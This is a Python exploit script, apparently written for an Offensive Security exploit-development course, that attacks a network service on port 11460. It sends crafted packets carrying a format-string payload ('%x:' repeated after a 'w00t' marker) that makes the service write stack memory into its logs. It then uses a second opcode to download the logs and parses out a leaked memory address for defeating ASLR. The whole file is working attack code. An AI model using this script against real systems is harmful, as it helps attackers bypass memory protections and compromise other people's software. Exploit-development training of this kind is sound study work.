#!/usr/bin/env python3

import socket
import sys
import time
from struct import pack

# Note: The way Offensive Security wanted this made had a logic flaw, so instead of trying to find the end
# of the logs, it downloads all the logs (you can specify the start point to speed up future executions).

def main():
    server = "192.168.185.10"
    startValue = 0x3a000 # Default 0x00. Change to speed up start of search.
    if len(sys.argv) >= 2:
        server = sys.argv[1]

    port = 11460

    # psAgentCommand
    buf = pack(">i", 0x400)
    buf += bytearray([0x41] * 0xC)
    buf += pack("<i", 0x604)  # opcode
    buf += pack("<i", 0x0)  # 1st memcpy: offset
    buf += pack("<i", 0x100)  # 1st memcpy: size field
    buf += pack("<i", 0x100)  # 2nd memcpy: offset
    buf += pack("<i", 0x100)  # 2nd memcpy: size field
    buf += pack("<i", 0x200)  # 3rd memcpy: offset
    buf += pack("<i", 0x100)  # 3rd memcpy: size field
    buf += bytearray([0x41] * 0x8)

    # psCommandBuffer
    buf += b"w00t" + b"%x:" * 0x80
    buf += b"B" * 0x100
    buf += b"C" * 0x100

    # Padding
    buf += bytearray([0x41] * (0x404 - len(buf)))

    print("Sending memory leak to log...")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect((server, port))
    s.send(buf)

    response = s.recv(4)
    response_size = int(response.hex(), 16)

    response = b""
    bytes_downloaded = 0
    try:
        while True:
            response += s.recv(4096)
            if len(response) >= response_size:
                break
    except Exception as e:
        print(e)
        print(response_size)
        print(len(response))

    print("Searching logs for w00t...")
    # startValue = 0x00
    w00t_finds = []
    while True:

        # psAgentCommand
        buf = pack(">i", 0x400)
        buf += bytearray([0x41] * 0xC)
        buf += pack("<i", 0x520)  # opcode
        buf += pack("<i", 0x0)  # 1st memcpy: offset
        buf += pack("<i", 0x100)  # 1st memcpy: size field
        buf += pack("<i", 0x100)  # 2nd memcpy: offset
        buf += pack("<i", 0x100)  # 2nd memcpy: size field
        buf += pack("<i", 0x200)  # 3rd memcpy: offset
        buf += pack("<i", 0x100)  # 3rd memcpy: size field
        buf += bytearray([0x41] * 0x8)

        # psCommandBuffer
        buf += b"FileType: %d ,Start: %d, Length: %d" % (1, startValue, 0x1000)
        buf += b"B" * 0x100
        buf += b"C" * 0x100

        # Padding
        buf += bytearray([0x41] * (0x404 - len(buf)))

        s.send(buf)

        response = s.recv(4)
        response_size = int(response.hex(), 16)

        print("Downloading... Start Value: " + str(hex(startValue)) + " Size: " + str(hex(response_size)))

        response = b""
        bytes_downloaded = 0
        try:
            while True:
                response += s.recv(4096)
                if len(response) >= response_size:
                    break
        except Exception as e:
            print(e)
            print(response_size)
            print(len(response))

        woot_split = response.split(b'w00t')

        if len(woot_split) > 1:
            for i in range(1, len(woot_split)):
                w00t_finds.append(woot_split[i][0:0x80])

        if response_size >= 0x100000:
            startValue += 0x1000
            continue

        break

    print(w00t_finds[-1])
    leaked_address_bytes = w00t_finds[-1].split(b':')[1]
    leaked_address = int(leaked_address_bytes, 16)
    print("Leaked address: " + str(hex(leaked_address)))

    s.close()

    print("[+] Packet sent")
    sys.exit(0)


if __name__ == "__main__":
    main()